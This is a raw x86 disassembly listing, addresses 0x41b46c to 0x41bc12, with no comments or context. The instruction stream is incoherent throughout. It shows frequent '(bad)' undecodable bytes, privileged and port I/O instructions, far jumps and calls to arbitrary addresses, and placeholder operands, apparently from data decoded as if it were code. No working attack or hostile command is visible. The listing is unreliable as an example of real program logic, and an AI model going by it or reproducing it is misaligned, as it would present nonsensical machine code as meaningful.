  41b46c:	cmp    BYTE PTR [eax+0x6fdc4178],cl
  41b472:	sbb    al,0xa8
  41b474:	cmp    eax,0x9f22b742
  41b479:	in     eax,0xd9
  41b47b:	mov    ecx,0x50fd1070
  41b480:	nop
  41b481:	or     DWORD PTR [edx-0x20],eax
  41b484:	pushf  
  41b485:	mov    eax,ds:0xca0f76ec
  41b48a:	mov    al,ds:0x58db1bc4
  41b48f:	add    eax,0x5da29c97
  41b494:	out    dx,al
  41b495:	or     al,0xea
  41b497:	int    0x17
  41b499:	or     ebx,edx
  41b49b:	xchg   edx,eax
  41b49c:	jmp    0xd3bf3dc5
  41b4a1:	ja     0x41b45a
  41b4a3:	test   BYTE PTR ds:0x928735e3,dh
  41b4a9:	sbb    BYTE PTR [esi-0x70],0x87
  41b4ad:	repnz cli 
  41b4af:	jge    0x41b4f1
  41b4b1:	inc    ecx
  41b4b2:	loope  0x41b4d5
  41b4b4:	add    BYTE PTR [ebx],ch
  41b4b6:	mov    cl,0xbe
  41b4b8:	sub    al,0xf7
  41b4ba:	adc    DWORD PTR [edi],eax
  41b4bc:	das    
  41b4bd:	mov    eax,0xe10f4a18
  41b4c2:	lea    esp,[eax+0x1b503bf6]
  41b4c8:	sbb    edi,esp
  41b4ca:	push   eax
  41b4cb:	mov    ecx,0x129fd76c
  41b4d0:	dec    ecx
  41b4d2:	stos   DWORD PTR es:[edi],eax
  41b4d3:	stos   DWORD PTR es:[edi],eax
  41b4d4:	out    0xe3,al
  41b4d6:	inc    edx
  41b4d7:	sub    al,BYTE PTR [ecx]
  41b4d9:	(bad)  
  41b4da:	push   esp
  41b4db:	xor    BYTE PTR [edi],0xd9
  41b4de:	mov    ebx,0xe2baf81b
  41b4e3:	push   esi
  41b4e4:	and    ecx,DWORD PTR [edx-0x55d2eb1c]
  41b4ea:	push   ss
  41b4eb:	dec    edi
  41b4ec:	in     eax,dx
  41b4ed:	cwde   
  41b4ee:	ins    DWORD PTR es:[edi],dx
  41b4ef:	(bad)  
  41b4f0:	(bad)  
  41b4f1:	repz and ebx,DWORD PTR [edx+0x1f]
  41b4f5:	cld    
  41b4f6:	xchg   esi,eax
  41b4f7:	sub    DWORD PTR [edi-0x3a],esi
  41b4fa:	daa    
  41b4fb:	cmp    ebx,DWORD PTR [esi+0x2531a0d5]
  41b501:	js     0x41b559
  41b503:	xchg   esi,eax
  41b504:	dec    ebx
  41b505:	xor    DWORD PTR [esi+0x128dfd09],0xffffff8c
  41b50c:	fwait
  41b50d:	sbb    DWORD PTR [ebx],ebp
  41b50f:	call   0x774bfd49
  41b514:	cmp    esp,DWORD PTR [ebx+0x71]
  41b517:	mov    ecx,0xf61d9ebd
  41b51c:	in     al,0xfd
  41b51e:	inc    ebx
  41b51f:	jmp    edx
  41b521:	(bad)  
  41b522:	hlt    
  41b523:	mov    bl,0xe9
  41b525:	mov    ebp,esi
  41b527:	pusha  
  41b528:	xor    bl,BYTE PTR ds:0x89fe96c4
  41b52e:	cmp    eax,0x3acbf57e
  41b533:	inc    edi
  41b534:	test   BYTE PTR [ebp+ebx*2-0x2cc31a5c],dl
  41b53b:	mov    ds:0xd60eaf6f,eax
  41b540:	and    cl,BYTE PTR [ebx-0x60665400]
  41b546:	and    esp,DWORD PTR [edx]
  41b548:	jae    0x41b50a
  41b54a:	test   al,0x9
  41b54c:	sub    ah,BYTE PTR [eax+0x7f]
  41b54f:	cld    
  41b550:	sbb    DWORD PTR [esi-0x27],eax
  41b553:	and    bh,dl
  41b555:	xchg   edx,eax
  41b556:	daa    
  41b557:	mov    ds:0x8bd4cd12,al
  41b55c:	xor    BYTE PTR ds:0xafae7bf3,ah
  41b562:	push   esp
  41b563:	inc    ebp
  41b564:	pop    eax
  41b565:	or     DWORD PTR [esi-0x4045704c],esp
  41b56b:	aam    0xc2
  41b56d:	iret   
  41b56e:	push   esi
  41b56f:	fisubr WORD PTR [eax-0x7b0dc75b]
  41b575:	mov    ah,0xf2
  41b577:	repnz inc edi
  41b579:	enter  0xd3ae,0x13
  41b57d:	sbb    BYTE PTR [ebx-0x3f],ch
  41b580:	or     dh,BYTE PTR ds:0xcb128b17
  41b586:	pushfw 
  41b588:	in     eax,0xee
  41b58a:	push   cs
  41b58b:	xchg   esp,eax
  41b58c:	js     0x41b57d
  41b58e:	pop    esp
  41b58f:	test   ebx,edi
  41b591:	les    eax,FWORD PTR [ebp-0x5061244a]
  41b597:	xchg   ecx,eax
  41b598:	lds    ecx,FWORD PTR [ecx+0x879857e]
  41b59e:	sar    al,0x98
  41b5a1:	adc    dl,bl
  41b5a3:	add    bh,BYTE PTR [edi+0x52b5b5f0]
  41b5a9:	cmp    ch,BYTE PTR [ebx+eiz*1+0x25]
  41b5ad:	clc    
  41b5ae:	repnz test bl,ch
  41b5b1:	push   es
  41b5b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5b3:	mov    bl,0x54
  41b5b5:	xchg   BYTE PTR [eax],dh
  41b5b7:	retf   
  41b5b8:	or     eax,ebp
  41b5ba:	mov    cl,0x9c
  41b5bc:	leave  
  41b5bd:	ins    BYTE PTR es:[edi],dx
  41b5be:	add    al,bh
  41b5c0:	ret    0x955b
  41b5c3:	adc    BYTE PTR [edi-0x57],bl
  41b5c6:	sbb    DWORD PTR [edi+0x739b0d79],ebx
  41b5cc:	mov    ebx,0xcc8079b6
  41b5d1:	es ja  0x41b5e2
  41b5d4:	jnp    0x41b62f
  41b5d6:	pop    eax
  41b5d7:	push   ebp
  41b5d8:	outs   dx,DWORD PTR ds:[esi]
  41b5d9:	and    DWORD PTR [edx+eax*2],ebx
  41b5dc:	or     edx,DWORD PTR [edi-0x7f79444c]
  41b5e2:	jmp    0x67170d31
  41b5e7:	stc    
  41b5e8:	mov    bl,0x67
  41b5ea:	sbb    al,0x67
  41b5ec:	cli    
  41b5ed:	leave  
  41b5ee:	add    BYTE PTR [eax],ah
  41b5f0:	inc    eax
  41b5f1:	mov    BYTE PTR [ebx-0x7b],cl
  41b5f4:	call   0x256bff73
  41b5f9:	imul   eax,edx,0xffffffa9
  41b5fc:	(bad)  
  41b5fd:	jnp    0x41b661
  41b5ff:	push   ebx
  41b600:	enter  0x8b6c,0x4c
  41b604:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b605:	push   eax
  41b606:	ja     0x41b594
  41b608:	xor    ah,bh
  41b60a:	(bad)  
  41b60b:	mov    ecx,0x45b9009
  41b610:	pop    eax
  41b611:	or     edx,esi
  41b613:	daa    
  41b614:	or     DWORD PTR [edx],eax
  41b616:	and    DWORD PTR [eax+ebx*2],edi
  41b619:	add    esp,edx
  41b61b:	in     al,0xab
  41b61d:	add    al,BYTE PTR [ecx+0x56]
  41b620:	(bad)  
  41b621:	push   ss
  41b622:	dec    ecx
  41b623:	call   0x14f94e5
  41b628:	(bad)  
  41b629:	sub    ah,dh
  41b62b:	jbe    0x41b5b9
  41b62d:	jo     0x41b5d7
  41b62f:	(bad)  
  41b630:	mov    ds:0xb892c3e6,al
  41b635:	mov    edi,0xef6e677f
  41b63a:	cld    
  41b63b:	rcr    DWORD PTR [eax+ebx*1+0x6b],0x9f
  41b640:	retf   0x90a8
  41b643:	xor    BYTE PTR [edx-0x27883490],al
  41b649:	and    eax,0xfb840b85
  41b64e:	enter  0xeb42,0x47
  41b652:	pop    esi
  41b653:	test   al,0x67
  41b655:	shl    DWORD PTR [eax+0x3b41640e],1
  41b65b:	(bad)  
  41b65c:	jle    0x41b679
  41b65e:	jle    0x41b673
  41b660:	retf   
  41b661:	push   0xffffff81
  41b663:	test   DWORD PTR [eax],ebp
  41b665:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b666:	lahf   
  41b667:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b668:	fsubr  st(7),st
  41b66a:	mov    ebx,0x666be6d0
  41b66f:	inc    esp
  41b670:	add    eax,0x3c05df62
  41b675:	jmp    0x41b686
  41b677:	inc    esi
  41b678:	sahf   
  41b679:	xchg   ecx,eax
  41b67a:	adc    bh,ah
  41b67c:	data16 test BYTE PTR [esi-0x27fbbf71],bl
  41b683:	out    0xee,al
  41b685:	pmulhw mm1,QWORD PTR [edx]
  41b688:	xchg   bh,dh
  41b68a:	fs push 0x95505bca
  41b690:	push   0xe331ce0a
  41b695:	iret   
  41b696:	js     0x41b6bc
  41b698:	ins    BYTE PTR es:[edi],dx
  41b699:	test   eax,0x64011742
  41b69e:	pop    ebp
  41b69f:	ins    DWORD PTR es:[edi],dx
  41b6a0:	sahf   
  41b6a1:	into   
  41b6a2:	jg     0x41b65f
  41b6a4:	in     eax,dx
  41b6a5:	fdivr  st,st(0)
  41b6a7:	int    0xfc
  41b6a9:	xor    eax,0x4db77596
  41b6ae:	cmc    
  41b6af:	push   0x81b6401c
  41b6b4:	mov    ch,0x7f
  41b6b6:	and    al,0x72
  41b6b8:	lahf   
  41b6b9:	or     BYTE PTR [esp+eax*1+0x1b],dh
  41b6bd:	add    BYTE PTR [esi],0x19
  41b6c0:	std    
  41b6c1:	retf   
  41b6c2:	or     eax,0x919867d
  41b6c7:	fbld   TBYTE PTR [esi-0x5]
  41b6ca:	addr16 mov eax,0x1e3ff977
  41b6d0:	add    edi,ebx
  41b6d2:	fild   WORD PTR [ebx+0x1]
  41b6d5:	imul   ecx,DWORD PTR [edi+0x7],0xab9e1dad
  41b6dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b6dd:	bound  ebp,QWORD PTR [edi-0x38]
  41b6e0:	inc    edi
  41b6e1:	(bad)  
  41b6e2:	adc    al,0xc
  41b6e4:	test   eax,0xefe5937d
  41b6e9:	or     eax,0x67c1bd5e
  41b6ee:	stos   BYTE PTR es:[edi],al
  41b6ef:	int3   
  41b6f0:	mov    bl,0xc5
  41b6f2:	xchg   esi,eax
  41b6f3:	adc    ah,BYTE PTR [ecx-0x64b5901]
  41b6f9:	dec    ebx
  41b6fa:	mov    WORD PTR [ecx],cs
  41b6fc:	mov    ah,0x6a
  41b6fe:	mov    ebx,0xe71d0ca3
  41b703:	pop    esp
  41b704:	inc    edx
  41b705:	loopne 0x41b75d
  41b707:	or     eax,0xfbf521bd
  41b70c:	xor    dl,cl
  41b70e:	sbb    DWORD PTR [esi+0x14],esp
  41b711:	leave  
  41b712:	adc    al,BYTE PTR [esi+0x8544294]
  41b718:	jns    0x41b6e9
  41b71a:	imul   esp,DWORD PTR [esi],0xc899ec42
  41b720:	sub    DWORD PTR [esi+ebx*8+0x7e],0xccde2917
  41b728:	test   BYTE PTR [edx-0x3d],ch
  41b72b:	pop    eax
  41b72c:	imul   ecx,DWORD PTR [ebx+0x6ff392f4],0xffffffc8
  41b733:	mov    WORD PTR [edx+0x2c5d1c7d],?
  41b739:	pop    es
  41b73a:	je     0x41b749
  41b73c:	and    eax,0xffff7232
  41b741:	lods   al,BYTE PTR ds:[esi]
  41b742:	rol    DWORD PTR [ebp+0x4c],0xd8
  41b746:	xor    cl,ch
  41b748:	sbb    ecx,edx
  41b74a:	and    dl,BYTE PTR [ebx-0x41ff359f]
  41b750:	fwait
  41b751:	std    
  41b752:	pop    ds
  41b753:	and    eax,DWORD PTR [esi]
  41b755:	mov    edx,0x926535e8
  41b75a:	or     eax,0x2c336a1e
  41b75f:	imul   eax,DWORD PTR [ecx-0x5e401a01],0x8907966
  41b769:	arpl   sp,bx
  41b76b:	cmc    
  41b76c:	sub    bl,BYTE PTR [edi+edx*2-0x71]
  41b770:	pop    es
  41b771:	enter  0x12f5,0x5a
  41b775:	nop
  41b776:	dec    edx
  41b777:	int    0x1d
  41b779:	outs   dx,DWORD PTR ds:[esi]
  41b77a:	stos   DWORD PTR es:[edi],eax
  41b77b:	cmp    ebp,DWORD PTR [edx-0x526010b]
  41b781:	outs   dx,BYTE PTR ds:[esi]
  41b782:	sbb    DWORD PTR [edx-0x63],eax
  41b785:	lock push DWORD PTR [bx+di+0x5ea6]
  41b78b:	and    dh,BYTE PTR [ebx-0x208c9003]
  41b791:	popf   
  41b792:	mov    gs,WORD PTR [edx+0x7deadd78]
  41b798:	test   BYTE PTR [eax-0x67e8d654],0x45
  41b79f:	adc    esp,DWORD PTR [eax+ecx*1-0x29]
  41b7a3:	xor    eax,0xe9df796
  41b7a8:	pop    ebx
  41b7a9:	adc    edx,DWORD PTR [ecx]
  41b7ab:	rcl    al,cl
  41b7ad:	leave  
  41b7ae:	or     BYTE PTR [ebx],al
  41b7b0:	int3   
  41b7b1:	sub    ah,BYTE PTR [eax+0x1c2a70cf]
  41b7b7:	sub    bl,BYTE PTR [ebx+ecx*1-0x7f7fc58d]
  41b7be:	cmc    
  41b7bf:	xchg   BYTE PTR [ecx],al
  41b7c1:	(bad)  
  41b7c3:	push   cs
  41b7c4:	dec    edx
  41b7c5:	or     al,BYTE PTR [esi-0x6c]
  41b7c8:	add    al,bl
  41b7ca:	int3   
  41b7cb:	mov    ah,0x5a
  41b7cd:	popf   
  41b7ce:	je     0x41b7db
  41b7d0:	mov    WORD PTR [edx+0x26],?
  41b7d3:	inc    esp
  41b7d4:	pop    ds
  41b7d5:	stos   BYTE PTR es:[edi],al
  41b7d6:	jno    0x41b76f
  41b7d8:	es or  bl,al
  41b7db:	in     al,0x6f
  41b7dd:	jl     0x41b7b3
  41b7df:	cmp    eax,0xe3ee3ca9
  41b7e4:	repnz push 0xffffffcd
  41b7e7:	call   0xd300694a
  41b7ec:	aad    0x3c
  41b7ee:	es pop ss
  41b7f0:	add    esp,edi
  41b7f2:	cmp    ebp,DWORD PTR [edi-0x57]
  41b7f5:	xchg   esp,eax
  41b7f6:	pop    ds
  41b7f7:	les    ebx,FWORD PTR [ebp+0x70]
  41b7fa:	lods   al,BYTE PTR ds:[esi]
  41b7fb:	mov    ecx,0xa0bb1577
  41b800:	xchg   ah,cl
  41b802:	xor    dh,BYTE PTR es:[eax-0x51]
  41b806:	sti    
  41b807:	sbb    al,0x0
  41b809:	ffree  st(6)
  41b80b:	jmp    0x486b:0xe170a890
  41b812:	xor    eax,DWORD PTR [esi]
  41b814:	jmp    0x41b79b
  41b816:	xor    dh,bl
  41b818:	into   
  41b819:	jg     0x41b7cc
  41b81b:	mov    esp,0x6921aae0
  41b820:	call   0xdbe9:0xb705f220
  41b827:	and    ch,BYTE PTR [ebp-0x710e264b]
  41b82d:	xlat   BYTE PTR ds:[ebx]
  41b82e:	rol    BYTE PTR [eax],0xb
  41b831:	fdiv   DWORD PTR ds:0xee281551
  41b837:	sbb    BYTE PTR [ebx-0x67],ch
  41b83a:	xor    DWORD PTR [edx+0x37],0xad65fbb1
  41b841:	adc    cl,ch
  41b843:	in     al,0x84
  41b845:	je     0x41b7f7
  41b847:	shl    BYTE PTR [ebx-0x5c],cl
  41b84a:	sbb    DWORD PTR [eax],ecx
  41b84c:	xor    al,0x4c
  41b84e:	adc    al,0xc3
  41b850:	ret    
  41b851:	mov    DWORD PTR ds:0x376892ea,esi
  41b857:	or     al,0xed
  41b859:	push   ebx
  41b85a:	sub    eax,0xb75e8f97
  41b85f:	(bad)  
  41b860:	test   al,0xe6
  41b862:	xor    cl,BYTE PTR [edi]
  41b864:	ret    0x437a
  41b867:	and    bh,BYTE PTR [ecx+0x9]
  41b86a:	cmp    al,BYTE PTR [ebx+0x66]
  41b86d:	jno    0x41b883
  41b86f:	push   0x264fcd2e
  41b874:	es add cl,cl
  41b877:	dec    esi
  41b878:	call   0xcb91a077
  41b87d:	pop    ebx
  41b87e:	jp     0x41b8c4
  41b880:	shr    BYTE PTR [ecx],cl
  41b882:	arpl   WORD PTR [ecx+0x48],di
  41b885:	cmp    ah,BYTE PTR ds:0xfdfe289e
  41b88b:	shl    BYTE PTR [edi+0x79ea83f3],cl
  41b891:	iret   
  41b892:	cmp    BYTE PTR [esi+0x7],0x25
  41b896:	mov    ecx,0x3337d8da
  41b89b:	out    0xcd,eax
  41b89d:	jno    0x41b867
  41b89f:	xchg   ecx,eax
  41b8a0:	adc    bl,al
  41b8a2:	cmp    al,0x2b
  41b8a4:	mov    eax,0xc1e73bbe
  41b8a9:	jmp    0x741b7e55
  41b8ae:	ret    0xad7f
  41b8b1:	push   eax
  41b8b2:	jp     0x41b8f0
  41b8b4:	pop    edx
  41b8b5:	lea    ebp,ds:0x832f18db
  41b8bb:	mov    dl,0x5a
  41b8bd:	(bad)  
  41b8be:	imul   edx,DWORD PTR [ecx+0x75e0a79b],0xb1cef370
  41b8c8:	stos   BYTE PTR es:[edi],al
  41b8c9:	push   es
  41b8ca:	sbb    al,0x8
  41b8cc:	scas   eax,DWORD PTR es:[edi]
  41b8cd:	dec    eax
  41b8ce:	sahf   
  41b8cf:	(bad)  
  41b8d0:	mov    ds:0x8b0d3612,al
  41b8d5:	inc    ebp
  41b8d6:	pop    edi
  41b8d7:	pop    edx
  41b8d8:	and    DWORD PTR [edx],0xb1b69809
  41b8de:	(bad)  
  41b8df:	jne    0x41b8af
  41b8e1:	test   ch,ah
  41b8e3:	pop    ds
  41b8e4:	jge    0x41b950
  41b8e6:	xchg   esp,eax
  41b8e7:	es mov ebx,0xa7b2397c
  41b8ed:	arpl   WORD PTR [ebx+0x8],bx
  41b8f0:	jmp    0xa1e7:0x3ad09b3e
  41b8f7:	xor    ecx,edi
  41b8f9:	call   0x2dfb6360
  41b8fe:	repnz sbb al,BYTE PTR [eax]
  41b901:	stc    
  41b902:	sbb    eax,0x6c592a9
  41b907:	jb     0x41b8ab
  41b909:	stc    
  41b90a:	jne    0x41b940
  41b90c:	cmp    eax,0x43438e27
  41b911:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b912:	cld    
  41b913:	shl    BYTE PTR ds:0x640f0e42,cl
  41b919:	and    DWORD PTR [esi+0x17723ca1],eax
  41b91f:	cmp    DWORD PTR [ebp+eiz*4+0x5d18fe8b],ebp
  41b926:	fs je  0x41b8fc
  41b929:	mul    bl
  41b92b:	jp     0x41b904
  41b92d:	cdq    
  41b92e:	mov    ah,bl
  41b930:	mov    al,0x46
  41b932:	loopne 0x41b8bf
  41b934:	push   ecx
  41b935:	xor    eax,0x4a484d26
  41b93a:	fcomp  DWORD PTR [ebx]
  41b93c:	imul   ecx,DWORD PTR [eax],0x44df7599
  41b942:	das    
  41b943:	and    al,0xd9
  41b945:	xchg   edx,eax
  41b946:	(bad)  
  41b947:	sti    
  41b948:	loope  0x41b8d8
  41b94a:	fld    QWORD PTR [edx]
  41b94c:	mov    eax,ds:0xc90dd81e
  41b951:	call   0x972e2663
  41b956:	push   ebp
  41b957:	not    DWORD PTR [ecx]
  41b959:	adc    DWORD PTR [edi+0x7f],ecx
  41b95c:	mov    esp,0x44692bf
  41b961:	ins    BYTE PTR es:[edi],dx
  41b962:	mov    eax,ds:0x262ea7f9
  41b967:	push   0xd694f0ce
  41b96c:	add    DWORD PTR [ebx-0x156d9d98],ecx
  41b972:	jl     0x41b92a
  41b974:	push   eax
  41b975:	addr16 sahf 
  41b977:	(bad)  
  41b978:	pop    esp
  41b979:	lock cmp eax,0x9ede5c17
  41b97f:	mov    bh,0x6a
  41b981:	sti    
  41b982:	inc    eax
  41b983:	mov    WORD PTR [esp+esi*2-0x2c],cs
  41b987:	icebp  
  41b988:	add    ah,ah
  41b98a:	imul   eax,DWORD PTR [ebx],0xffffff8f
  41b98d:	in     al,dx
  41b98e:	xlat   BYTE PTR ds:[ebx]
  41b98f:	mov    al,0x5
  41b991:	call   0xb23c:0xdcdf86e2
  41b998:	fs pushf 
  41b99a:	add    al,0xa1
  41b99c:	inc    ecx
  41b99d:	(bad)  
  41b99e:	mov    DWORD PTR [ecx],ebx
  41b9a0:	std    
  41b9a1:	jmp    0xe15834ae
  41b9a6:	retf   0x8f68
  41b9a9:	sbb    al,0x2f
  41b9ab:	xor    al,0xf4
  41b9ad:	pop    edi
  41b9ae:	mov    bh,0xad
  41b9b0:	cmp    edx,ecx
  41b9b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b9b3:	lds    ecx,FWORD PTR [ebx]
  41b9b5:	push   0x39
  41b9b7:	inc    ebp
  41b9b8:	sbb    BYTE PTR [ebp-0x75],ch
  41b9bb:	xor    BYTE PTR [esp+eiz*8+0x1e5ac685],bl
  41b9c2:	call   0xf2a:0x37fa0107
  41b9c9:	or     BYTE PTR [ebx],0xf8
  41b9cc:	test   DWORD PTR [ecx-0x7bf9d0c],0x1caf7988
  41b9d6:	push   esi
  41b9d7:	inc    ebx
  41b9d8:	xchg   DWORD PTR [ecx-0x36],edi
  41b9db:	iret   
  41b9dc:	sub    ecx,DWORD PTR [edi-0x2ec46d63]
  41b9e2:	data16 xor bl,dl
  41b9e5:	mov    BYTE PTR [edx+0x6c],dh
  41b9e8:	das    
  41b9e9:	ins    BYTE PTR es:[edi],dx
  41b9ea:	mov    dh,0xe2
  41b9ec:	stos   DWORD PTR es:[edi],eax
  41b9ed:	dec    ebx
  41b9ee:	xchg   BYTE PTR [esp+ebx*8],dl
  41b9f1:	inc    esp
  41b9f2:	sub    ah,BYTE PTR [edi]
  41b9f4:	repz sub eax,0xfde5de37
  41b9fa:	cdq    
  41b9fb:	rol    DWORD PTR [edx+0x45],cl
  41b9fe:	jle    0x41b9ba
  41ba00:	push   ebx
  41ba01:	inc    esp
  41ba02:	es cmp al,0xe8
  41ba05:	cmp    DWORD PTR [edi],ebx
  41ba07:	mov    DWORD PTR [ecx],ecx
  41ba09:	nop
  41ba0a:	fistp  DWORD PTR [edi+0x73]
  41ba0d:	dec    BYTE PTR [edi+0x63e2e19a]
  41ba13:	icebp  
  41ba14:	call   DWORD PTR [edx-0x50f01d3e]
  41ba1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba1b:	sub    dh,BYTE PTR [esi+0x2c]
  41ba1e:	dec    ebx
  41ba1f:	clc    
  41ba20:	in     eax,0xd8
  41ba22:	jae    0x41ba57
  41ba24:	mov    al,ds:0xb54c07d3
  41ba29:	sbb    eax,0x2d49ef10
  41ba2e:	or     al,0x7d
  41ba30:	sub    BYTE PTR [eax],dl
  41ba32:	jae    0x41ba00
  41ba34:	pushf  
  41ba35:	dec    ebp
  41ba36:	sub    DWORD PTR [ebp+0x75c5d28],ecx
  41ba3c:	add    esp,esi
  41ba3e:	(bad)  
  41ba3f:	ficom  DWORD PTR [ecx+0x618d0af]
  41ba45:	aad    0x30
  41ba47:	lahf   
  41ba48:	pop    ebp
  41ba49:	jbe    0x41bab4
  41ba4b:	jl     0x41baaa
  41ba4d:	fwait
  41ba4e:	cld    
  41ba4f:	hlt    
  41ba50:	out    0xeb,al
  41ba52:	hlt    
  41ba53:	dec    edx
  41ba54:	ins    DWORD PTR es:[edi],dx
  41ba55:	das    
  41ba56:	cmc    
  41ba57:	dec    edi
  41ba58:	xchg   esi,esp
  41ba5a:	inc    eax
  41ba5b:	dec    eax
  41ba5c:	inc    esp
  41ba5d:	xchg   edx,eax
  41ba5e:	call   0xed3978c8
  41ba63:	adc    dh,BYTE PTR [eax-0x17]
  41ba66:	mov    ah,0xc5
  41ba68:	sub    ch,BYTE PTR [esi]
  41ba6a:	fisub  DWORD PTR [edx]
  41ba6c:	mov    bl,0x19
  41ba6e:	shl    BYTE PTR [ebx+ebx*8],1
  41ba71:	stos   DWORD PTR es:[edi],eax
  41ba72:	mov    BYTE PTR es:[eax-0x5b],cl
  41ba76:	loopne 0x41badb
  41ba78:	scas   al,BYTE PTR es:[edi]
  41ba79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba7a:	fs mov di,di
  41ba7e:	int    0x95
  41ba80:	xlat   BYTE PTR ds:[ebx]
  41ba81:	retf   
  41ba82:	or     eax,edx
  41ba84:	fimul  WORD PTR [ecx+0x53]
  41ba87:	pop    ds
  41ba88:	popa   
  41ba89:	inc    ebx
  41ba8a:	dec    ebx
  41ba8b:	shl    BYTE PTR [ebp+eiz*2-0x433587b2],1
  41ba92:	setnp  BYTE PTR [esi]
  41ba95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba96:	stc    
  41ba97:	sub    dl,BYTE PTR ds:0xbac0f983
  41ba9d:	pop    edi
  41ba9e:	ss jp  0x41ba48
  41baa1:	push   ebx
  41baa2:	mov    ch,BYTE PTR [eax-0x13b499f3]
  41baa8:	fld    st(3)
  41baaa:	adc    eax,0x6cb7697b
  41baaf:	mov    ds:0x4a344627,al
  41bab4:	mov    ch,0xc2
  41bab6:	repnz add al,0x20
  41bab9:	pop    esi
  41baba:	or     DWORD PTR [edi],edx
  41babc:	mov    cs,WORD PTR [esi+0x77]
  41babf:	pusha  
  41bac0:	fistp  WORD PTR [edx]
  41bac2:	lahf   
  41bac3:	fwait
  41bac4:	pop    edx
  41bac5:	mov    eax,ds:0x9880755f
  41baca:	ds stc 
  41bacc:	stos   DWORD PTR es:[edi],eax
  41bacd:	push   ebx
  41bace:	pushf  
  41bacf:	push   ebx
  41bad0:	sub    eax,0x551bb403
  41bad5:	fiadd  DWORD PTR [edi]
  41bad7:	jecxz  0x41bace
  41bad9:	inc    edi
  41bada:	test   al,0x64
  41badc:	adc    edx,DWORD PTR [ecx-0x5c0e1935]
  41bae2:	sbb    BYTE PTR [ebx],cl
  41bae4:	and    cl,BYTE PTR [ebx-0x5be4b702]
  41baea:	add    al,0x9e
  41baec:	and    DWORD PTR [edi-0x37262b06],edx
  41baf2:	push   eax
  41baf3:	jle    0x41bab0
  41baf5:	call   0x1f17:0xead8f9c5
  41bafc:	outs   dx,DWORD PTR ds:[esi]
  41bafd:	inc    ecx
  41bafe:	sub    DWORD PTR [ebx],0x1637485c
  41bb04:	(bad)  
  41bb05:	inc    eax
  41bb06:	inc    eax
  41bb07:	and    bl,al
  41bb09:	xor    BYTE PTR [edi],dh
  41bb0b:	fsubrp st(0),st
  41bb0d:	addr16 dec esp
  41bb0f:	mov    eax,ds:0x4a36f3c9
  41bb14:	pop    edi
  41bb15:	mov    ch,0xc
  41bb17:	adc    eax,0x304204e6
  41bb1c:	mov    WORD PTR [esi-0x2a],es
  41bb1f:	enter  0x2401,0xc9
  41bb23:	bswap  ecx
  41bb25:	arpl   si,cx
  41bb27:	sbb    edi,DWORD PTR [edi]
  41bb29:	xor    eax,0xa5c84b16
  41bb2e:	jl     0x41baca
  41bb30:	sahf   
  41bb31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb32:	dec    edx
  41bb33:	es mov ebp,0x4398cab5
  41bb39:	sti    
  41bb3a:	icebp  
  41bb3b:	adc    BYTE PTR ds:0x59c8c2f1,ah
  41bb41:	sbb    BYTE PTR [ecx+0x74],0x84
  41bb45:	xchg   DWORD PTR [edx],esi
  41bb47:	push   eax
  41bb48:	ss addr16 xchg ecx,eax
  41bb4b:	daa    
  41bb4c:	outs   dx,BYTE PTR ds:[esi]
  41bb4d:	shr    ebp,cl
  41bb4f:	scas   eax,DWORD PTR es:[edi]
  41bb50:	test   eax,0xa7ce313b
  41bb55:	out    dx,eax
  41bb56:	test   DWORD PTR es:[edi],esp
  41bb59:	cmp    eax,0xa1e4c917
  41bb5e:	mov    cl,BYTE PTR gs:[esi-0x397d2c0a]
  41bb65:	inc    esi
  41bb66:	icebp  
  41bb67:	adc    dh,al
  41bb69:	lea    edx,[edx+edx*2]
  41bb6c:	sbb    cl,BYTE PTR [edx+esi*4+0x5e0284f6]
  41bb73:	pop    ebx
  41bb74:	sub    eax,0xf9b986af
  41bb79:	or     al,0xb8
  41bb7b:	rep stos BYTE PTR es:[edi],al
  41bb7d:	push   ebp
  41bb7e:	ret    
  41bb7f:	(bad)  
  41bb80:	lahf   
  41bb81:	jmp    0xe699:0xb8e108ec
  41bb88:	dec    esp
  41bb89:	mov    ebp,0x124c89fb
  41bb8e:	loopne 0x41bbd1
  41bb90:	mov    dl,0x35
  41bb92:	cmp    BYTE PTR [edx-0xd90008b],dh
  41bb98:	sub    bl,BYTE PTR [edx+0x739a5143]
  41bb9e:	pop    esi
  41bb9f:	ja     0x41bb96
  41bba1:	into   
  41bba2:	cmc    
  41bba3:	pop    edx
  41bba4:	mov    ecx,0x174a5b60
  41bba9:	cmp    DWORD PTR [ecx+0x4c],0xffffffde
  41bbad:	dec    esp
  41bbae:	jmp    0x787c359b
  41bbb3:	lods   eax,DWORD PTR ds:[esi]
  41bbb4:	cmp    ah,ah
  41bbb6:	mov    edx,cs
  41bbb8:	sar    BYTE PTR [ebx+0x14],cl
  41bbbb:	xchg   ebx,eax
  41bbbc:	gs or  dl,cl
  41bbbf:	mov    ebx,0x56b758ff
  41bbc4:	pop    edx
  41bbc5:	mov    bh,dh
  41bbc7:	mov    ch,0xcf
  41bbc9:	xor    eax,0xf272b9ce
  41bbce:	ja     0x41bc35
  41bbd0:	xchg   esi,eax
  41bbd1:	mov    esi,0x50dab257
  41bbd6:	es mov edx,0x3831901e
  41bbdc:	cmp    al,0xaa
  41bbde:	or     eax,DWORD PTR [ebx]
  41bbe0:	mov    ebx,eax
  41bbe2:	test   al,0xcf
  41bbe4:	and    bl,0x61
  41bbe7:	in     eax,0xdf
  41bbe9:	cwde   
  41bbea:	jno    0x41bc31
  41bbec:	leave  
  41bbed:	sbb    BYTE PTR [ebx],bh
  41bbef:	mov    ebx,0x64323867
  41bbf4:	loope  0x41bba2
  41bbf6:	ja     0x41bc59
  41bbf8:	test   al,0xea
  41bbfa:	sub    al,0x4d
  41bbfc:	mov    ds:0xd0540cd0,eax
  41bc01:	xor    ch,bh
  41bc03:	sbb    eax,0xb29e6b97
  41bc08:	dec    edi
  41bc09:	aad    0x3
  41bc0b:	sbb    eax,0x60aee80f
  41bc10:	icebp  
  41bc11:	inc    esi
  41bc12:	cmp    eax,0x60943a98
